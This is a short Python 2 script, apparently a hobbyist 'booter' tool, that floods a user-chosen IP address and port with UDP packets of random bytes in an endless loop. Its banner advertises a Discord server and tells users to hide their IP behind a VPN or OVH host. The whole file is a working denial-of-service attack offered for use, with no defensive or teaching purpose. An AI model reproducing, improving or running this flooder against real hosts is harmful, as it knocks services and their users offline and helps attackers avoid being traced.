import sys
import os
import random
import socket
from sys import platform

"""
Created By: sp00k
"""

if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;31m [-]Unknown System Detected \033[1;m"

print "\033[1;31m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
                      .oooo.      .oooo.  oooo        
                     d8P'`Y8b   d8P'`Y8b  `888       
 .oooo.o oo.ooooo.  888    888 888    888  888  oooo  
d88(  "8  888' `88b 888    888 888    888  888 .8P'   
`"Y88b.   888   888 888    888 888    888  888888.    
o.  )88b  888   888 `88b  d88' `88b  d88'  888 `88b.  
8""888P'  888bod8P'  `Y8bd8P'   `Y8bd8P'  o888o o888o 
          888                                         
         o888o                                        
  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             Created By: sp00k
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
        don't go crazy on the bytes 
 because you'll end up hitting yourself off 
             discord.gg/sGRCSyH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          python 2.7.15 works best
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            Your IP is VISIBLE. 
   If you're using a VPN/OVH. Ignore this.
"""



try:
    size = input("Bytes> ")
    attack = random._urandom(size)
    ip = raw_input("IP> ")
    port = input("Port> ")
    print " "
    print "sp00king has commenced"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print "sp00king ===>"
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.16")
